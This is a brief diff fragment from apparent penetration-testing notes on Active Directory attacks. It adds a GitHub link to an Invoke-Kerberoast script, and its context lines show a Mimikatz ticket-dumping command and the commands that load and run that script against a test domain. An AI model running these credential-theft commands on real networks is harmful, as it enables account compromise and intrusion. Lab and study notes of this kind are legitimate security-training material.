@@ -105,6 +105,7 @@ TGT and TGS:
 1. sekurlsa::tickets
 ```
 ###### Service Account Attacks
+https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-Kerberoast.ps1
 ```
 Import-module .\Invoke-Kerberoast.ps1
 Get-DomainSearcher -Domain testlab.local
